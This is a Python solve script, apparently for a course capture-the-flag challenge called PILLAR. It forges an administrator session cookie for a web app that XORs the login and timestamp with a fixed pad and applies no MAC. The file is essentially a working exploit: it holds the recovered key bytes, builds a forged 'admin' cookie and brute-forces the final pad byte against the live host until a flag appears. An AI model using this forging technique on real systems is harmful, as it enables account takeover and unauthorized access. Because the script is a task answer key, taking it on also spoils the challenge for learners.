#!/usr/bin/env python3
"""PILLAR solve.

Cookie = base64(xor("<login>:<unix_ts>", PAD))  -- plain XOR stream, key wraps mod len(PAD).
There is NO MAC: the "11-byte token" is really ":<unix_ts>" where ts = now+180 (Max-Age=180).
So the login is attacker controlled -> forge login "admin" (16 bytes, needs 1 pad byte past
the recovered 15).  Pad recovered from known plaintext (login 'test') + the Max-Age clock.
"""
import requests, base64, re, time
B="https://pillar.is-course.ru"
PAD=bytes.fromhex("36683475a4c8b1b552419f1802d1d6")   # "6h4u" + 11 bytes
def enc(p): return bytes(c ^ PAD[i%len(PAD)] for i,c in enumerate(p))
def get(c):
    r=requests.get(B+"/", cookies={"session":base64.b64encode(c).decode()}, timeout=10)
    m=re.findall(r"YDS\{[^}]*\}", r.text)
    if m: return m[0]
    return None if "Welcome, Anonymous" in r.text or "delimiter" in r.text else "?"
def solve(login=b"admin"):
    head=enc(login+b":"+str(int(time.time())+170).encode())[:-1]
    for v in range(256):                      # pad byte past the recovered 15
        f=get(head+bytes([v]))
        if f and f!="?": return f
    return None
if __name__=="__main__":
    f=solve(); print(f); print("FLAG:", open("pillar_flag.txt").read().strip()==f)
